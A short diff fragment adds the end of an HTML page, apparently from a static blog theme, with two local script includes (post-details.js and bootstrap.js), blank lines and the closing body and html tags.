+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
